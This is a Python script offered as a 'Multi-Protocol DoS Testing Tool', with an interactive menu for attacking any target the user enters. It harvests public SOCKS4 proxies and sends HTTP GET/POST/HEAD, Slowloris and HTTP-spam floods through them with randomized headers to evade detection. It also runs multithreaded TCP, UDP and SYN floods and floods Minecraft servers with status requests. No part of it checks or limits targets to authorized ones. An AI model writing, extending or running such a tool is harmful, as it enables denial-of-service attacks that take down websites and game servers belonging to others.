import os
os.system("pip install -r requirements.txt 2>nul")

import socket
import threading
import random
import time
import sys
import requests
import mcstatus
from pystyle import *
from concurrent.futures import ThreadPoolExecutor
from itertools import cycle
import json
import hashlib
import string
import urllib3
import logging
import platform
import subprocess
import psutil
import colorama
from colorama import Fore, Back, Style
from datetime import datetime
import argparse
import ipaddress
import asyncio
import aiohttp

# Initialize colorama
colorama.init()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('dos_tool.log'),
        logging.StreamHandler()
    ]
)

banner = Center.XCenter("""
██████╗  ██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗     
██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██║  ██║██║   ██║███████╗       ██║   ██║   ██║██║   ██║██║     
██║  ██║██║   ██║╚════██║       ██║   ██║   ██║██║   ██║██║     
██████╔╝╚██████╔╝███████║       ██║   ╚██████╔╝╚██████╔╝███████╗
╚═════╝  ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                    Multi-Protocol DoS Testing Tool
""")

# Create requirements.txt
with open("requirements.txt", "w") as f:
    f.write("""requests
mcstatus
pystyle
cryptography
colorama
psutil
aiohttp
urllib3
""")

class SystemInfo:
    @staticmethod
    def get_system_info():
        info = {
            "os": platform.system(),
            "os_release": platform.release(),
            "cpu_count": psutil.cpu_count(),
            "memory_total": psutil.virtual_memory().total,
            "memory_available": psutil.virtual_memory().available,
            "disk_usage": psutil.disk_usage('/').percent
        }
        return info

    @staticmethod
    def print_system_info():
        info = SystemInfo.get_system_info()
        print(f"\n{Fore.CYAN}System Information:{Style.RESET_ALL}")
        print(f"OS: {info['os']} {info['os_release']}")
        print(f"CPU Cores: {info['cpu_count']}")
        print(f"Total Memory: {info['memory_total'] // (1024**3)}GB")
        print(f"Available Memory: {info['memory_available'] // (1024**3)}GB")
        print(f"Disk Usage: {info['disk_usage']}%")

class ProxyChecker:
    def __init__(self):
        self.valid_proxies = []
        self.max_proxies = 0
        
    async def check_proxy(self, proxy, semaphore):
        if len(self.valid_proxies) >= self.max_proxies:
            return
            
        async with semaphore:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get('http://httpbin.org/ip', 
                                         proxy=f"socks4://{proxy}",
                                         timeout=2) as response:
                        if response.status == 200:
                            self.valid_proxies.append(proxy)
                            print(f"{Fore.GREEN}[+] Valid proxy found: {proxy} ({len(self.valid_proxies)}/{self.max_proxies}){Style.RESET_ALL}")
            except:
                pass

    async def check_proxies(self, proxies, max_proxies=100):
        self.max_proxies = max_proxies
        semaphore = asyncio.Semaphore(500)  # Increased concurrent connections
        tasks = []
        for proxy in proxies:
            if len(self.valid_proxies) >= max_proxies:
                break
            task = asyncio.create_task(self.check_proxy(proxy, semaphore))
            tasks.append(task)
        await asyncio.gather(*tasks)
        return self.valid_proxies

class PayloadGenerator:
    @staticmethod
    def generate_random_string(length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    @staticmethod
    def generate_http_payload():
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'X-Requested-With': PayloadGenerator.generate_random_string(10),
            'Cookie': f'session={PayloadGenerator.generate_random_string(32)}'
        }
        return headers

class DosTest:
    def __init__(self):
        self.running = False
        self.proxies = []
        self.start_time = None
        self.packets_sent = 0
        self.bytes_sent = 0
        self.methods = {
            "HTTP-GET": self.http_get,
            "HTTP-POST": self.http_post,
            "HTTP-HEAD": self.http_head,
            "TCP-FLOOD": self.tcp_flood,
            "UDP-FLOOD": self.udp_flood,
            "SYN-FLOOD": self.syn_flood,
            "SLOWLORIS": self.slowloris,
            "HTTP-SPAM": self.http_spam
        }
        
    def load_proxies(self, max_proxies=100):
        proxy_apis = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt"
        ]
        
        for api in proxy_apis:
            try:
                r = requests.get(api, timeout=5)
                self.proxies.extend(r.text.splitlines())
            except:
                logging.warning(f"Failed to fetch proxies from {api}")
                continue
                
        self.proxies = list(set(self.proxies))  # Remove duplicates
        
        print(f"{Fore.YELLOW}[*] Checking proxies, this may take a moment...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Will stop after finding {max_proxies} valid proxies{Style.RESET_ALL}")
        
        # Validate proxies asynchronously
        checker = ProxyChecker()
        self.proxies = asyncio.run(checker.check_proxies(self.proxies, max_proxies))
        
        logging.info(f"Loaded {len(self.proxies)} valid proxies")
        print(f"{Fore.GREEN}[+] Successfully loaded {len(self.proxies)} valid proxies{Style.RESET_ALL}")

    def minecraft_attack(self, ip, port=25565, java=True):
        while self.running:
            try:
                if java:
                    server = mcstatus.JavaServer(ip, port)
                else:
                    server = mcstatus.BedrockServer(ip, port)
                server.status()
                self.packets_sent += 1
                self.bytes_sent += 1024  # Approximate bytes per packet
                print(f"{Fore.CYAN}[*] Sent Minecraft packet to {ip}:{port}{Style.RESET_ALL}")
            except:
                pass
            time.sleep(0.1)

    def http_get(self, url, proxy):
        try:
            headers = PayloadGenerator.generate_http_payload()
            response = requests.get(
                url, 
                proxies={'http': f'socks4://{proxy}', 'https': f'socks4://{proxy}'}, 
                headers=headers,
                timeout=2
            )
            self.packets_sent += 1
            self.bytes_sent += len(response.content)
            print(f"{Fore.GREEN}[+] HTTP-GET via {proxy}{Style.RESET_ALL}")
        except:
            pass

    def http_post(self, url, proxy):
        try:
            headers = PayloadGenerator.generate_http_payload()
            data = {'data': random._urandom(1024)}
            response = requests.post(
                url,
                data=data,
                proxies={'http': f'socks4://{proxy}', 'https': f'socks4://{proxy}'},
                headers=headers,
                timeout=2
            )
            self.packets_sent += 1
            self.bytes_sent += len(str(data))
            print(f"{Fore.YELLOW}[+] HTTP-POST via {proxy}{Style.RESET_ALL}")
        except:
            pass

    def http_head(self, url, proxy):
        try:
            headers = PayloadGenerator.generate_http_payload()
            response = requests.head(
                url,
                proxies={'http': f'socks4://{proxy}', 'https': f'socks4://{proxy}'},
                headers=headers,
                timeout=2
            )
            self.packets_sent += 1
            self.bytes_sent += len(str(headers))
            print(f"{Fore.BLUE}[+] HTTP-HEAD via {proxy}{Style.RESET_ALL}")
        except:
            pass

    def tcp_flood(self, ip, port):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                payload = random._urandom(random.randint(1024, 4096))
                s.send(payload)
                self.packets_sent += 1
                self.bytes_sent += len(payload)
                print(f"{Fore.MAGENTA}[*] TCP packet sent to {ip}:{port}{Style.RESET_ALL}")
                s.close()
            except:
                pass

    def udp_flood(self, ip, port):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(random.randint(1024, 4096))
                s.sendto(payload, (ip, port))
                self.packets_sent += 1
                self.bytes_sent += len(payload)
                print(f"{Fore.RED}[*] UDP packet sent to {ip}:{port}{Style.RESET_ALL}")
            except:
                pass

    def syn_flood(self, ip, port):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(0)
                s.connect_ex((ip, port))
                self.packets_sent += 1
                self.bytes_sent += 64  # SYN packet size
                print(f"{Fore.WHITE}[*] SYN packet sent to {ip}:{port}{Style.RESET_ALL}")
            except:
                pass

    def slowloris(self, url, proxy):
        try:
            headers = PayloadGenerator.generate_http_payload()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((url, 80))
            s.send(f"GET / HTTP/1.1\r\nHost: {url}\r\n".encode())
            
            while self.running:
                header = f"X-a: {PayloadGenerator.generate_random_string(10)}\r\n"
                s.send(header.encode())
                self.packets_sent += 1
                self.bytes_sent += len(header)
                print(f"{Fore.YELLOW}[*] Slowloris keeping connection alive{Style.RESET_ALL}")
                time.sleep(15)
        except:
            pass

    def http_spam(self, url, proxy):
        try:
            while self.running:
                headers = PayloadGenerator.generate_http_payload()
                data = '&'.join([f"{PayloadGenerator.generate_random_string(8)}={PayloadGenerator.generate_random_string(8)}" for _ in range(50)])
                response = requests.post(
                    url,
                    data=data,
                    proxies={'http': f'socks4://{proxy}', 'https': f'socks4://{proxy}'},
                    headers=headers,
                    timeout=2
                )
                self.packets_sent += 1
                self.bytes_sent += len(data)
                print(f"{Fore.CYAN}[*] HTTP-SPAM via {proxy}{Style.RESET_ALL}")
        except:
            pass

    def layer7_attack(self, url, method):
        if not self.proxies:
            print(f"{Fore.RED}[!] No proxies loaded. Please load proxies first.{Style.RESET_ALL}")
            return
            
        proxy_pool = cycle(self.proxies)
        while self.running:
            try:
                proxy = next(proxy_pool)
                self.methods[method](url, proxy)
            except StopIteration:
                if self.proxies:
                    proxy_pool = cycle(self.proxies)
                else:
                    print(f"{Fore.RED}[!] No valid proxies remaining{Style.RESET_ALL}")
                    break

    def layer4_attack(self, ip, port, method):
        while self.running:
            self.methods[method](ip, port)

    def print_stats(self):
        while self.running:
            time.sleep(1)
            duration = time.time() - self.start_time
            pps = self.packets_sent / duration
            mbps = (self.bytes_sent * 8 / 1024 / 1024) / duration
            print(f"\rStats: {self.packets_sent} packets sent | {pps:.2f} packets/sec | {mbps:.2f} Mbps", end='')

    def start_attack(self, target, port=None, threads=100, attack_type="HTTP-GET"):
        self.running = True
        self.start_time = time.time()
        self.packets_sent = 0
        self.bytes_sent = 0
        thread_pool = []
        
        # Start stats thread
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.start()
        
        print(f"{Fore.YELLOW}\n[*] Starting {attack_type} attack with {threads} threads{Style.RESET_ALL}")
        
        for _ in range(threads):
            if attack_type in ["HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS", "HTTP-SPAM"]:
                t = threading.Thread(target=self.layer7_attack, args=(target, attack_type))
            elif attack_type in ["TCP-FLOOD", "UDP-FLOOD", "SYN-FLOOD"]:
                t = threading.Thread(target=self.layer4_attack, args=(target, port, attack_type))
            elif attack_type == "minecraft-java":
                t = threading.Thread(target=self.minecraft_attack, args=(target, port or 25565, True))
            elif attack_type == "minecraft-bedrock":
                t = threading.Thread(target=self.minecraft_attack, args=(target, port or 19132, False))
            
            thread_pool.append(t)
            t.start()

        return thread_pool

def main():
    dos = DosTest()
    print(Colorate.Vertical(Colors.purple_to_red, banner))
    
    # Print system information
    SystemInfo.print_system_info()
    
    while True:
        print(f"\n{Fore.CYAN}Available attack methods:{Style.RESET_ALL}")
        print(Colors.white + """1. Layer7 - HTTP/HTTPS Website
2. Layer4 - TCP/UDP/SYN Flood
3. Minecraft Java
4. Minecraft Bedrock  
5. Load Proxies
6. Exit""")

        choice = input(f"{Fore.YELLOW}\nChoose attack method (1-6): {Style.RESET_ALL}")

        if choice == "1":
            url = input(f"{Fore.GREEN}Enter website URL: {Style.RESET_ALL}")
            print("\nLayer7 Methods:")
            print("1. HTTP-GET\n2. HTTP-POST\n3. HTTP-HEAD\n4. SLOWLORIS\n5. HTTP-SPAM")
            method = int(input(f"{Fore.GREEN}Choose method (1-5): {Style.RESET_ALL}"))
            threads = int(input(f"{Fore.GREEN}Enter number of threads: {Style.RESET_ALL}"))
            
            methods = ["HTTP-GET", "HTTP-POST", "HTTP-HEAD", "SLOWLORIS", "HTTP-SPAM"]
            dos.start_attack(url, threads=threads, attack_type=methods[method-1])

        elif choice == "2":
            ip = input(f"{Fore.GREEN}Enter target IP: {Style.RESET_ALL}")
            port = int(input(f"{Fore.GREEN}Enter port: {Style.RESET_ALL}"))
            print("\nLayer4 Methods:")
            print("1. TCP-FLOOD\n2. UDP-FLOOD\n3. SYN-FLOOD")
            method = int(input(f"{Fore.GREEN}Choose method (1-3): {Style.RESET_ALL}"))
            threads = int(input(f"{Fore.GREEN}Enter number of threads: {Style.RESET_ALL}"))
            
            methods = ["TCP-FLOOD", "UDP-FLOOD", "SYN-FLOOD"]
            dos.start_attack(ip, port, threads, attack_type=methods[method-1])

        elif choice in ["3", "4"]:
            ip = input(f"{Fore.GREEN}Enter server IP: {Style.RESET_ALL}")
            port = input(f"{Fore.GREEN}Enter port (leave empty for default): {Style.RESET_ALL}")
            threads = int(input(f"{Fore.GREEN}Enter number of threads: {Style.RESET_ALL}"))
            
            port = int(port) if port else None
            attack_type = "minecraft-java" if choice == "3" else "minecraft-bedrock"
            dos.start_attack(ip, port, threads, attack_type)

        elif choice == "5":
            max_proxies = int(input(f"{Fore.GREEN}Enter number of proxies needed (default 100): {Style.RESET_ALL}") or 100)
            dos.load_proxies(max_proxies)

        elif choice == "6":
            print(f"{Fore.RED}Exiting...{Style.RESET_ALL}")
            dos.running = False
            sys.exit()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Attack interrupted by user{Style.RESET_ALL}")
        sys.exit()
